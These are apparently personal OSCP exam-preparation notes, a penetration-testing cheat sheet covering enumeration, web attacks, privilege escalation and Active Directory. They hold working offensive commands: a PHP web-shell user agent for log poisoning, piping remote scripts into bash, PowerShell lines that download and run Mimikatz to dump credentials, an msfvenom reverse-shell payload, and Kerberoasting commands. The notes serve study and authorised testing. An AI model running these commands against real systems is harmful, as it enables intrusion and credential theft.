---
description: Just some rough notes in preparation for the OSCP.
---

# OSCP Notes

### Enumeration

* Ensure you run FeroxBuster or GoBuster with file extensions identified throughout inital enumeration of the device.
* Personally I like running the following scans to perform enumeration:
  1. `nmap -sV -sC -p- --min-rate 1000 -T4 [IP] -oA Full-TCP-Scan`
  2. `nmap -sU --top-ports 1000 -T4 [IP] -oA Quick-UDP-Scan`
  3. `nmap -p[PORTS] --script=vuln [IP] -oA Vuln-Scan`
* If Ident is available then we may be able to enumerate users. While `nmap -sC` should successfully enumerate users as well, it is good to double check.&#x20;
  * Install ident-user-enum: `apt install ident-user-enum`
  * Run it against all identified ports: `ident-user-enum [IP] 22 53 113 5432 8080 1000`Iden

### Web Application

* If you are getting the following message `You are not a search engine. Permission denied.` when attempting to browse to robots.txt then set your user agent in Burp to the following:&#x20;
  * `User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)`
* If a login page default password doesn't work then think of what a lazy admin would use (uppercase and lowercase). CeWL can be used here if you're running out of ideas.
* If a web application is vulnerable to SSRF and the host is Windows, you may be able to retrieve a Net-NTLMv2 hash. The following command assumes that the web server is running on TCP/8080:
  * `http://:8080/?url=http://127.0.0.1:8080/?url=http://<RESPONDER_IP>`
  * [This attack is explained amazingly in this blog post](https://blog.blazeinfosec.com/leveraging-web-application-vulnerabilities-to-steal-ntlm-hashes-2/).
* If a WebDav directory is discovered during enumeration then it should be noted that an LFI vulnerability could be used to obtain the password and upload a PHP shell. The following is an example of a Webdav password location:
  * `/var/www/html/webdav/passwd.dav`
  * [HackTricks has a great guide](https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav) on uploading a shell with Curl or other methods of exploitation.
* When testing[ Remote File Inclusion](../web-application/remote-file-inclusion-rfi.md) keep in mind that the port being tested matters.&#x20;
  * Use a common port such as 80 or 443 on your Python3 server when testing.

### SQL Injection (SQLi)

* Oracle SQLi - [This link](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html) is beyond useful. Ensure your syntax is correct with Oracle because it can be a pain.

### Initial Access

* Always try to login with default passwords and with using the username as a password. For example, if a username has been identiifed as `parzival` try and login with the password `parzival`
* Sometimes a simple wordlist can be your friend.. Ensure dumb combinations are attempted  like `admin:admin`
* If testing for Shellshock on SMTP then I have found[ this exploit ](https://github.com/3mrgnc3/pentest\_old/blob/master/postfix-shellshock-nc.py)to be the most reliable. It requires a valid email address so ensure you run `VRFY` to enumerate a valid email prior to execution.
* If you can access the Apache logs through LFI and observe the 'User Agent' is viewable, we can potentially specify our user agent to PHP code and execute that on the target machine. [This video from John Hammond](https://www.youtube.com/watch?v=u\_uuk7FWWF4) is a great example.
  * Using this we can potentially turn an LFI into RCE. An example user agent would be the following: `User-Agent: <?php system(\$_GET['c']); ?>`
* Log into the SMTP server to identify the version if it is not returned in the Nmap scan. Identifying Postfix means that multiple exploits from Searchsploit may work: `searchsploit postfix`

### Privilege Escalation - Linux

* If LinPEAS doesn't return anything useful then it is possible you already have the information needed to privilege escalate. Try default passwords, [priv esc with fail2ban](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/), and other common tricks.
* For privilege escalation with fail2ban, use a netcat shell or modify the permissions of `/etc/shadow`
  * [Amazing Guide on Privilege Escalation with Fail2ban](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/)
* If there are no writable directories then just pipe LinPEAS (or other tool of choice) directly into bash:
  * `curl 10.10.10.1:8080/linpeas.sh | bash`
  * Run the following command to identify possible priivlege escalation efforts:
    * `which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`
  * If you've identified a CronJob that may be exploitable then it may be worth plugging it into [CronGuru](https://crontab.guru/#\*/3\_\*\_\*\_\*\_\*).
  * If you are a member of the 'Docker' group then there are multiple opportunities for privilege escalation.  Below is a list of a few examples:
    1. `docker images`
    2. `docker run -v /:/mnt --rm -it [IMAGE] chroot /mnt sh`
  * If breaking out of a restricted shell, ensure you check the local bin and then GTFOBins for any easy breakouts.
    *   Sometimes you will have to export your path after breaking out of a restricted shell. Use the following command to correct your path:

        ```
        export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

        ```

###

### Privilege Escalation - Windows

* PowerShell Empire has some great PS1 scripts readily available such as `Invoke-Watson` and `Invoke-MS16032` as examples. Their `Mimikatz.ps1` is also great. These can be accessed at `/usr/share/powershell-empire/empire/server/data/module_source/`
* Unable to get Mimikatz onto a machine? Simply host a http server and execute the following:
  * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`&#x20;
  * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam`
* Mimikatz errors? Need to downgrade your version? Use the version availabke at [this link](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/).

### Session Passing

* If you have a shell via Netcat on a Windows machine, try using Curl to download a  ps1 to the target and executing it.
  * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh -o meterpreter-64.ps1`

### Active Directory

* You can perform post exploitation activities such as Kerberoasting with a machine account. This may be important if you cannot find another path to exploitation:
  * `GetUserSPNs.py -request 'DOMAIN/MACHINE$' -dc-ip DC -hashes 'LM:NTLM'`
* PowerView is your best friend when attempting to pivot. Run the following commands to get the lay of the land and perform exploitation activities.

#### Get Domain Computers

* `Get-NetUser * -Domain corp.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset, lastlogontimestamp,accountexpires,admincount,userprincipalname, serviceprincipalname, mail,useraccountcontrol | Export-CSV users.csv`

#### Get Domain Computers

* `Get-NetComputer * -Domain corp.local | Select-Object -Property dnshostname,operatingsystem,operatingsystemservicepack,lastlogontimestamp | Export-CSV computers.csv`

#### SPN Ticket Request

* `Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation`

### General Tips and Tricks

* Transferring a file such as a .doc to a FTP share? Reminder to use `binary` before doing so or else it will upload as ASCII.&#x20;
* When enumerating FTP, ensure you run `dir -a` to enumerate any hidden files or directories on the system. You may find l00t!
* Metasploit and Meterpreter are only allowed against one machine in the exam so ensure that you are sure before executing. There may be other ways to accomplish what you want (e.g., CrackMapExec, Lsassy, etc).&#x20;

### Helpful Blogs

* [List of Kerberos attacks with different tooling](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

### Helpful OSCP Cheatsheets

* [OSCP Enumeration Cheatsheet](https://strongcourage.github.io/2020/05/03/enum.html)
* [iRedTeam Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)

References While Building my Notes

* [FareedFauzi's Notes](https://fareedfauzi.gitbook.io/oscp-notes/others/active-directory-attack)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts)
